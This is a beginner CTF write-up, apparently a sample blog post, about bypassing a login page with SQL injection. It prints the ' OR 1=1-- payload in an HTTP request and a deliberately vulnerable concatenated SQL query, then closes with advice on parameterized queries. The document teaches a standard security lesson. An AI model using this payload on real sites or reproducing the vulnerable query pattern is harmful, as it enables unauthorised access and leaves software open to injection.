---
title: "Sample CTF - SQL Injection 101"
date: 2026-04-02 14:00:00 +0300
categories: [TryHackMe, Web]
tags: [sqli, python, ssrf, docker, beginner, sample]
---

## Challenge

**Event:** Sample CTF 2026  
**Category:** Web  
**Difficulty:** Easy  
**Points:** 100

We are given a login page at `http://challenge.ctf/login` that accepts a username and password. The hint says: *"Maybe the database trusts you too much."*

## Reconnaissance

Browsing to the login form shows a simple PHP backend. Submitting `' OR 1=1--` as the username returns a successful login without a valid password.

```http
POST /login HTTP/1.1
Host: challenge.ctf
Content-Type: application/x-www-form-urlencoded

username=' OR 1=1--&password=anything
```

## Exploitation

The vulnerable query is likely:

```sql
SELECT * FROM users WHERE username = '$username' AND password = '$password'
```

Our payload closes the username string and comments out the rest:

```sql
SELECT * FROM users WHERE username = '' OR 1=1--' AND password = 'anything'
```

After logging in, the dashboard reveals the flag.

## Flag

```
CTF{sql_injection_is_still_relevant}
```

## Takeaways

- Always use parameterized queries (prepared statements).
- Never concatenate user input into SQL strings.
- Input validation alone is not sufficient — use proper query APIs.
